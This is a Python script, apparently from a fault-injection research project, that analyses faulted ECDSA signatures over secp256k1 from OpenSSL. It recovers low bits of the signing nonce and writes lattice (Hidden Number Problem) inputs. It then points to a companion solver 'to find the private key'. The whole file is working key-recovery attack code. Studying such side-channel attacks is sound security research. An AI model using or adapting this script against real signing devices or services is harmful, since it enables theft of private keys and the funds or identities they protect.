from base64 import b64decode as b64d
from hashlib import sha256
import argparse
import os
import sys

sys.path.insert(0, '../pysimul/')
from pydfa.ec import *
from pydfa.dfa_analysis import dfa_swap_analysis


def pubkey_to_point(curve, pubkey_filename):
    '''convert the public key file of the signer into two integers (works for secp256k1)'''

    text = open(pubkey_filename, 'r').read().split('\n')
    pubkey = b64d(text[1] + text[2])
    xx, yy = int.from_bytes(pubkey[-64:-32], 'big'), int.from_bytes(pubkey[-32:], 'big')
    return curve.field(xx), curve.field(yy)


def sig_to_integer(sig_filename):
    '''convert the raw signature to a list of couple of integers (r,s)'''

    list_sig = []
    raw = open(sig_filename, 'rb').read()
    i = 0
    while i < len(raw):
        length = raw[i + 1]
        sig = raw[i + 2:i + 2 + length]
        i += (2 + length)
        rlen = sig[1]
        r = int.from_bytes(sig[2:2 + rlen], 'big')
        s = int.from_bytes(sig[4 + rlen:], 'big')
        list_sig.append((r,s))
        
    return list_sig


def msg_to_integer(msg_filename):
    '''convert the signed file to an integer with SHA-256'''
    return int.from_bytes(sha256(open(msg_filename, 'rb').read()).digest(), 'big')



def launch_attack(sig_filename, msg_filename, pubkey_filename, skip_min, skip_max, results_filename):
    curve = CurveJac(SECP256K1)
    pubkey = pubkey_to_point(curve, pubkey_filename)
    list_sig = sig_to_integer(sig_filename)
    msg = msg_to_integer(msg_filename)
        
    Ui, Vi, Li = [], [], []

    for i in range(len(list_sig)):
        sig = list_sig[i]

        # analysis
        valid, Q, QQ_list = points_from_sig(curve, pubkey, msg, sig)

        if valid:
            print(f'Signature {i} is valid: ineffective fault or no fault injected')
            continue
        
        print(f'Signature {i} invalid: fault was effective')
        leak = []
        for QQ in QQ_list:
            found, lsb = dfa_swap_analysis(curve, Q, QQ, skip_max)
            if found:
                leak.append(lsb % 2**skip_min)

        if len(leak) == 0:
            print('  Nothing found: fault might not have been correctly injected')
            continue
        if len(leak) > 1:
            print('  Too many solutions found: ignored')
            continue
        lsb = leak[0]
        if lsb == 0:
            print('  padded nonce mod 2^{skip_min} = 0, could be a false positive: ignored')
            continue
        print(f'  padded nonce mod 2^{skip_min} = {lsb}')


        # write data for Hidden Number Problem
        B1 = (2**curve.order.bit_length() - lsb + 1) >> skip_min
        B2 = (2**curve.order.bit_length() + curve.order - lsb) >> skip_min
        
        C = (B1 + B2)//2
        LL = curve.order//(B2 - B1)
        
        r, s = sig
        tmp = invmod(s*2**skip_min, curve.order)
        u = r*tmp % curve.order
        v = (msg - s*lsb)*tmp % curve.order
        vv = C - v
        
        Ui.append(u)
        Vi.append(vv)
        Li.append(LL)


    n = len(Ui)
    print(f'Number of useful faults: {n}')

    f = open(results_filename, 'w')
    # We only keep the curve name and the public key
    f.write(f'{curve.name},{pubkey[0].hex()},{pubkey[1].hex()}\n')
    for u,v,L in zip(Ui,Vi,Li):
        f.write(f'{u:x},{v:x},{L}\n')
    f.close()
        
    print(f'The results of the analysis are stored in {results_filename}')
    print(f'Run the command "python3 solve_hnp.py {results_filename}" to find the private key')
    


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='DFA / ECDSA / OpenSSL / secp256k1')

    
    parser.add_argument('--pubkey', action='store', dest='pubkey_filename', type=str,
                        help='/path/to/publickey', required=True)

    parser.add_argument('--sig', action='store', dest='sig_filename', type=str,
                        help='/path/to/signatures_file', required=True)

    parser.add_argument('--msg', action='store', dest='msg_filename', type=str,
                        help='/path/to/message', required=True)
    
    parser.add_argument('--skip', action='store', nargs=2, dest='skip', type=int,
                        help='loop iteration (min, max)', required=True)

    parser.add_argument('--out', action='store', dest='results_filename', type=str,
                        help='file name to store the results of analysis', required=True)
    
    args = parser.parse_args()    

    launch_attack(args.sig_filename, args.msg_filename, args.pubkey_filename, args.skip[0], args.skip[1], args.results_filename)

    
